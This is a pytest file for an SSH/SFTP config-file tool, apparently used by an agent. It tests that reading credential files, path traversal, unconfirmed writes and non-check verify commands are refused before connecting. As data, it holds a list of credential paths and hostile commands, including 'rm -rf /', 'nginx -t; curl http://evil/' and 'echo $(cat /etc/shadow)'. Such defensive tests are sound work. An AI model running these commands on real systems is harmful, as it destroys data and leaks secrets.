"""Tests for file_get / file_put — the SFTP path that replaces printf | tee.

Nothing here touches a network: every case is decided before the connection is
opened, which is exactly where the guarantees have to live.
"""
import asyncio
import os
import sys
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from security import validate_remote_file_path, validate_verify_command
from tools.file_transfer import file_get, file_put

HOST = {"host": "192.0.2.1", "user": "root", "key": "/app/keys/none.pem"}


def run(coro):
    return asyncio.run(coro)


# --- path rules -----------------------------------------------------------

@pytest.mark.parametrize("path", [
    "/etc/shadow",
    "/etc/gshadow",
    "/etc/sudoers",
    "/etc/sudoers.d/90-cloud-init-users",
    "/home/deploy/.ssh/authorized_keys",
    "/home/deploy/.ssh/id_rsa",
    "/opt/app/certs/server.key",
    "/opt/app/certs/client.pem",
])
def test_credential_paths_are_refused(path):
    with pytest.raises(PermissionError):
        validate_remote_file_path(path)


@pytest.mark.parametrize("path", [
    "/etc/nginx/nginx.conf",
    "/etc/nginx/conf.d/default.conf",
    "/var/www/site/wp-config.php",
    "/opt/registry-infra/docker-compose.yml",
    "/etc/systemd/system/backup.timer",
])
def test_config_paths_are_allowed(path):
    assert validate_remote_file_path(path) == path


def test_relative_path_is_rejected():
    with pytest.raises(ValueError):
        validate_remote_file_path("etc/nginx/nginx.conf")


def test_traversal_is_rejected():
    with pytest.raises(PermissionError):
        validate_remote_file_path("/etc/nginx/../../etc/shadow")


def test_trailing_slash_does_not_hide_a_denied_name():
    with pytest.raises(PermissionError):
        validate_remote_file_path("/etc/shadow/")


# --- file_put refuses before it connects ----------------------------------

def test_write_without_confirmation_is_refused():
    result = run(file_put({**HOST, "path": "/etc/nginx/nginx.conf", "content": "x"}))
    assert result["outcome"] == "refused"
    assert "confirmed=true" in result["error"]


def test_dry_run_does_not_need_confirmation():
    """It must fail on the connection, not on the missing confirmation."""
    result = run(file_put({**HOST, "path": "/etc/nginx/nginx.conf", "content": "x",
                           "dry_run": True, "timeout": 2}))
    assert "confirmed" not in result.get("error", "")


def test_content_must_be_a_string():
    result = run(file_put({**HOST, "path": "/etc/nginx/nginx.conf",
                           "content": {"nope": 1}, "confirmed": True}))
    assert result["outcome"] == "refused"


def test_mode_must_be_octal():
    result = run(file_put({**HOST, "path": "/etc/nginx/nginx.conf", "content": "x",
                           "mode": "rw-r-----", "confirmed": True}))
    assert result["outcome"] == "refused"
    assert "octal" in result["error"]


def test_oversized_content_is_refused():
    result = run(file_put({**HOST, "path": "/etc/nginx/nginx.conf",
                           "content": "x" * (600 * 1024), "confirmed": True}))
    assert result["outcome"] == "refused"
    assert "exceeds" in result["error"]


# --- what may run as a verification step ---------------------------------

@pytest.mark.parametrize("command", [
    "nginx -t",
    "apachectl configtest",
    "httpd -t",
    "php -l /var/www/site/wp-config.php",
    "sshd -t",
    "named-checkconf",
    "haproxy -c -f /etc/haproxy/haproxy.cfg",
    "systemd-analyze verify /etc/systemd/system/backup.service",
    "docker compose config",
    "python3 -m json.tool /etc/app/config.json",
])
def test_config_tests_are_allowed(command):
    validate_verify_command(command)


@pytest.mark.parametrize("command", [
    "rm -rf /var/www",                       # not a test at all
    "systemctl restart nginx",               # a reload is not a check
    "nginx -t && rm -rf /tmp/x",             # operators smuggle a second command
    "nginx -t; curl http://evil/",
    "nginx -t | tee /tmp/out",
    "nginx -t > /tmp/out",
    "echo $(cat /etc/shadow)",
    "",
])
def test_non_test_commands_are_refused(command):
    with pytest.raises((ValueError, PermissionError)):
        validate_verify_command(command)


def test_quoted_semicolon_in_a_test_is_still_data():
    validate_verify_command("php -l '/var/www/site with;semicolon/index.php'")


def test_bad_verify_cmd_is_refused_before_connecting():
    result = run(file_put({**HOST, "path": "/etc/nginx/nginx.conf", "content": "x",
                           "verify_cmd": "rm -rf /", "confirmed": True}))
    assert result["outcome"] == "refused"
    assert "verify_cmd" in result["error"]


# --- when strict host key checking turns itself on ------------------------

def test_strict_is_off_without_a_known_hosts_file(monkeypatch, tmp_path):
    """A fresh install has nothing to check against; rejecting everything is useless."""
    import security

    monkeypatch.delenv("SSH_STRICT_HOST_KEY", raising=False)
    monkeypatch.setattr(security, "KNOWN_HOSTS_PATH", str(tmp_path / "missing"))
    assert security.strict_host_key_default() is False


def test_strict_turns_on_once_there_are_keys(monkeypatch, tmp_path):
    import security

    known = tmp_path / "known_hosts"
    known.write_text("10.0.0.1 ssh-ed25519 AAAA\n", encoding="utf-8")
    monkeypatch.delenv("SSH_STRICT_HOST_KEY", raising=False)
    monkeypatch.setattr(security, "KNOWN_HOSTS_PATH", str(known))
    assert security.strict_host_key_default() is True


def test_an_empty_known_hosts_file_does_not_count(monkeypatch, tmp_path):
    import security

    known = tmp_path / "known_hosts"
    known.write_text("", encoding="utf-8")
    monkeypatch.delenv("SSH_STRICT_HOST_KEY", raising=False)
    monkeypatch.setattr(security, "KNOWN_HOSTS_PATH", str(known))
    assert security.strict_host_key_default() is False


@pytest.mark.parametrize("value,expected", [("false", False), ("true", True)])
def test_env_override_wins(monkeypatch, tmp_path, value, expected):
    import security

    known = tmp_path / "known_hosts"
    known.write_text("10.0.0.1 ssh-ed25519 AAAA\n", encoding="utf-8")
    monkeypatch.setattr(security, "KNOWN_HOSTS_PATH", str(known))
    monkeypatch.setenv("SSH_STRICT_HOST_KEY", value)
    assert security.strict_host_key_default() is expected


def test_the_jump_host_inherits_the_strict_default():
    from security import parse_jump

    jump = parse_jump({"jump_host": "10.0.0.9", "jump_user": "ops",
                       "jump_key": "/app/keys/a.pem"}, True, strict_default=True)
    assert jump["verify_host_key"] is True


# --- a dropped connection must not replay the write -----------------------

class _FakeStat:
    st_mode = 0o100640
    st_uid = 1000
    st_gid = 1000
    st_size = 11
    st_mtime = 1_700_000_000


class _FakeFile:
    def __init__(self, store, name):
        self.store, self.name, self.buf = store, name, b""

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        if self.buf:
            self.store[self.name] = self.buf
        return False

    def write(self, data):
        self.buf += data

    def read(self, size=-1):
        return self.store.get(self.name, b"")

    def prefetch(self):
        pass


class _FakeSftp:
    """Just enough SFTP to let file_put run against a dict."""

    def __init__(self, store):
        self.store = store

    def stat(self, path):
        if path not in self.store:
            raise FileNotFoundError(path)
        st = _FakeStat()
        st.st_size = len(self.store[path])
        return st

    def open(self, path, mode="r"):
        return _FakeFile(self.store, path)

    def chmod(self, path, mode):
        pass

    def chown(self, path, uid, gid):
        pass

    def posix_rename(self, src, dst):
        self.store[dst] = self.store.pop(src)

    def remove(self, path):
        self.store.pop(path, None)

    def close(self):
        pass


class _FakeClient:
    def __init__(self, store, counter):
        self.store, self.counter = store, counter

    def open_sftp(self):
        self.counter["passes"] += 1
        return _FakeSftp(self.store)


class _FakeEntry:
    def __init__(self, store, counter):
        self.client = _FakeClient(store, counter)
        self.host_key = {"mode": "warn"}
        self.lock = threading.Lock()


def test_a_dropped_connection_does_not_replay_the_write(monkeypatch):
    """Regression: retrying file_put re-reads the file it just replaced.

    The real _pooled retry path runs here on purpose. With a retry, the second
    pass reads the new content as the old one, reports "Content identical" about
    a config it had just replaced, and would treat the replacement as the thing
    to restore.
    """
    import paramiko

    from tools import file_transfer, ssh_pool

    store = {"/etc/app/config.json": b'{"old": 1}'}
    counter = {"passes": 0}

    monkeypatch.setattr(ssh_pool, "acquire",
                        lambda *a, **kw: (_FakeEntry(store, counter), True))
    monkeypatch.setattr(ssh_pool, "drop", lambda entry: None)
    monkeypatch.setattr(ssh_pool, "touch", lambda entry: None)

    def dying_exec(client, command, timeout):
        raise paramiko.SSHException("Server connection dropped")

    monkeypatch.setattr(file_transfer, "_exec", dying_exec)

    result = run(file_put({**HOST, "path": "/etc/app/config.json",
                           "content": '{"new": 2}', "confirmed": True,
                           "verify_cmd": "python3 -m json.tool /etc/app/config.json"}))

    assert counter["passes"] == 1, "the write must not be attempted twice"
    assert "Content identical" not in str(result), \
        "the content we just wrote is not 'nothing to write'"
    assert result.get("error"), "a connection lost mid-write has to be reported"
    assert "already in place" in result["error"]


def test_key_outside_the_keys_directory_is_refused():
    result = run(file_get({"host": "192.0.2.1", "user": "root",
                           "key": "/home/oleg/.ssh/id_rsa", "path": "/etc/hosts"}))
    assert result["outcome"] == "refused"


def test_password_auth_is_off_by_default():
    result = run(file_get({"host": "192.0.2.1", "user": "root",
                           "password": "hunter2", "path": "/etc/hosts"}))
    assert result["outcome"] == "refused"
    assert "ALLOW_SSH_PASSWORD" in result["error"]
